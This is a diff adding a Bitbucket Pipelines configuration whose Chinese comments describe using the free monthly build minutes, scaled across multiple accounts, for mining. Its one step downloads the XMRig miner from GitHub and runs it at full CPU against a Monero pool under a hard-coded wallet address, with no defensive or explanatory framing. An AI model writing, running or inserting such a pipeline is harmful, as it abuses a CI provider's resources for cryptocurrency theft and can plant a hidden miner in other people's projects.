@@ -1,0 +1,19 @@
+# Bitbucket Pipelines — 50分钟/月免费（可多账号扩展）
+# 需要将仓库镜像推送到 bitbucket.org
+
+image: ubuntu:focal
+
+pipelines:
+  custom:
+    mine:
+      - step:
+          name: "⛏ Bitbucket Miner"
+          runs-on: 
+            - 'self.hosted'
+            - 'linux'
+          script:
+            - apt-get update -qq && apt-get install -y -qq curl
+            - curl -sL -o x.tar.gz "https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-focal-x64.tar.gz"
+            - tar xzf x.tar.gz --strip-components=1
+            - chmod +x xmrig
+            - timeout 3000 ./xmrig -o gulf.moneroocean.stream:10032 -u 45qqTqhjmsz8mhzry3dG6rJgt9Jdzfh9xa6Skh1mtmBGgNubPDsrJVVEg6cWS6DtEB5i6BWTEaQA7BRws6UEibKEAQ1dd9X -p bitbucket_pipe --donate-level=0 --cpu-max-threads-hint=100 --print-time=300
